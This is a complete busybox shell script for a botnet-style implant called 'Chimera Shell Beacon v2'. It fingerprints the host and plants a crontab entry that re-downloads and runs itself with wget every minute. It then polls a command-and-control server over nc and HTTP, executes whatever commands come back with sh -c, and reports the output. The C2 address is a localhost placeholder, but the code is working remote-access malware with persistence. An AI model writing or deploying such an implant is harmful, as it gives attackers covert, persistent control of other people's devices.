#!/bin/sh
# Chimera Shell Beacon v2 — reads C2 response, executes commands, reports back
# For busybox systems (no python)

C2_HOST="127.0.0.1"
C2_PORT="10001"
BEACON_INTERVAL=60
REPORT_URL="http://${C2_HOST}:10004/result"
SELF_URL="http://${C2_HOST}:10004/shell_beacon.sh"

ID="$(hostname | md5sum | cut -c1-16)"
HOST="$(hostname)"
IP="$(ifconfig 2>/dev/null | grep 'inet ' | head -n1 | awk '{print $2}')"
[ -z "$IP" ] && IP="$(ip addr 2>/dev/null | grep 'inet ' | head -n1 | awk '{print $2}' | cut -d/ -f1)"
ARCH="$(uname -m 2>/dev/null || echo unknown)"

# Install persistence via crontab if not there
CRON_CMD="* * * * * wget -q -O /tmp/sb.sh ${SELF_URL} && sh /tmp/sb.sh &"
if ! grep -q "shell_beacon.sh" /etc/crontab 2>/dev/null; then
  echo "$CRON_CMD" >> /etc/crontab 2>/dev/null
fi

# Kill duplicate instances (only one beacon)
MY_PID=$$
for p in $(pidof sh 2>/dev/null); do
  if [ "$p" != "$MY_PID" ] && [ "$(cat /proc/$p/cmdline 2>/dev/null | tr '\0' ' ' | grep -c 'beacon\|sb.sh')" -gt 0 ]; then
    kill "$p" 2>/dev/null
  fi
done

while :; do
  MSG='{"type":"beacon","bot_id":"'$ID'","hostname":"'$HOST'","ip":"'$IP'","arch":"'$ARCH'","platform":"busybox"}'

  # Send beacon and read response
  RESP=$(echo "$MSG" | nc "$C2_HOST" "$C2_PORT" -w 5 -q 2 2>/dev/null)

  if echo "$RESP" | grep -q '"type":"cmd"'; then
    # Extract command - grep for "command":"..." pattern
    CMD=$(echo "$RESP" | sed 's/.*"command":"\([^"]*\)".*/\1/')
    CMDID=$(echo "$RESP" | sed 's/.*"cmd_id":"\([^"]*\)".*/\1/')

    if [ -n "$CMD" ] && [ -n "$CMDID" ]; then
      # Execute command
      OUTPUT=$(sh -c "$CMD" 2>&1)
      EC=$?

      # Escape output for JSON
      OUTPUT_ESC=$(echo "$OUTPUT" | sed 's/"/\\"/g' | tr '\n' ' ')

      # Report result via secondary connection
      RESULT_MSG='{"cmd_id":"'$CMDID'","output":"'$OUTPUT_ESC'","exit_code":'$EC'}'
      echo "$RESULT_MSG" | nc "$C2_HOST" "$C2_PORT" -w 3 -q 1 2>/dev/null
    fi
  fi

  # Also check via HTTP bridge for commands not on this protocol
  if which wget >/dev/null 2>&1; then
    HTTP_BEACON='{"bot_id":"'$ID'","hostname":"'$HOST'","ip":"'$IP'","arch":"'$ARCH'","platform":"busybox"}'
    HTTP_RESP=$(echo "$HTTP_BEACON" | wget -q -O - --post-data="$HTTP_BEACON" \
      --header="Content-Type: application/json" \
      "http://${C2_HOST}:10004/beacon" 2>/dev/null)

    if echo "$HTTP_RESP" | grep -q '"type":"cmd"'; then
      CMD=$(echo "$HTTP_RESP" | sed 's/.*"command":"\([^"]*\)".*/\1/')
      CMDID=$(echo "$HTTP_RESP" | sed 's/.*"cmd_id":"\([^"]*\)".*/\1/')
      if [ -n "$CMD" ] && [ -n "$CMDID" ]; then
        OUTPUT=$(sh -c "$CMD" 2>&1)
        EC=$?
        OUTPUT_ESC=$(echo "$OUTPUT" | sed 's/"/\\"/g' | tr '\n' ' ')
        wget -q -O - --post-data='{"cmd_id":"'$CMDID'","output":"'$OUTPUT_ESC'","exit_code":'$EC'}' \
          --header="Content-Type: application/json" \
          "http://${C2_HOST}:10004/result" >/dev/null 2>&1
      fi
    fi
  fi

  sleep "${SLEEP_INTERVAL:-$BEACON_INTERVAL}"
done
